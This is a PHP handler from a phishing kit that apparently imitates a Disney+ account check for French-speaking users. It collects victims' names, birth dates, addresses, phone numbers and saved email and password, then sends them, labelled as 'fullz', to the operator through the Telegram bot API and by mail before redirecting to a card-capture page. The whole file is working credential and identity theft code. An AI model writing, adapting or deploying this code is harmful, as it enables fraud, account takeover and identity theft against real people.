<?php
  error_reporting(0);
  ob_start();
  session_start();
include '../../email.php';
include '../../config2.php';

if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $_SESSION["surname"]    = $_POST["surname"];
    $_SESSION["name"]    = $_POST["name"];
    $_SESSION["dob"]= $_POST["dob"];
    $_SESSION["address"]   = $_POST["address"];
    $_SESSION["zipcode"]    = $_POST["zipcode"];
    $_SESSION["city"]= $_POST["city"];
    $_SESSION["tel"]   = $_POST["tel"];
$message = 'Nom : '.$_SESSION["surname"].'
<br>Prenom : '.$_SESSION["name"].'
<br>Date de naissance : '.$_SESSION["dob"].'
<br>Adresse : '.$_SESSION["address"].'
<br>Code Postal : '.$_SESSION["zipcode"].'
<br>Ville : '.$_SESSION["city"].'
<br>Numero de telephone : '.$_SESSION["tel"].'
<br>IP: '._ip().'
<br>User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
';
$Subject="+1 Fullz | "._ip();
$head  = 'MIME-Version: 1.0' . "\r\n";
$head .= 'Content-type: text/html; charset="utf-8"' . "\r\n";
$head .="From: Koda <rez@account-verif.com> \r\n" .
'X-Mailer: PHP/' . phpversion();
$_SESSION['step_two']  = true;

if($tlg_send == true)
{
  $data = [
    'text' => '
[⭐️ FULLZ ⭐️]

💫 Nom • '.$_SESSION["surname"].'
💫 Prénom • '.$_SESSION["name"].'
💫 Date De Naissance • '.$_SESSION["dob"].'

💫Téléphone • '. $_SESSION["tel"].'
💫 Adresse • '. $_SESSION["address"].'
💫 Ville • '.$_SESSION["city"].'
💫 Code Postal • '. $_SESSION["zipcode"].'

[🎓] KIM x DISNEY +1 LOG [🎓]

📘 E-Mail : '. $_SESSION["email"].'
🔑 Mot de passe : '. $_SESSION["pass"].'

[🔋] Tiers [🔋]
        
📡 Adresse Ip : '.$_SESSION['ip'].'
🤖 User-agent : '.$_SESSION['useragent'].'  
'
  ];
  
  file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id={$chat}&".http_build_query($data) );// Don't delete
}

if ($mail_send == true)
{
  mail($my_mail, $Subject, $msg, $head);
}
    header('location: ../card.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));

}
else
{
  header('location: ../../index.php');
} 

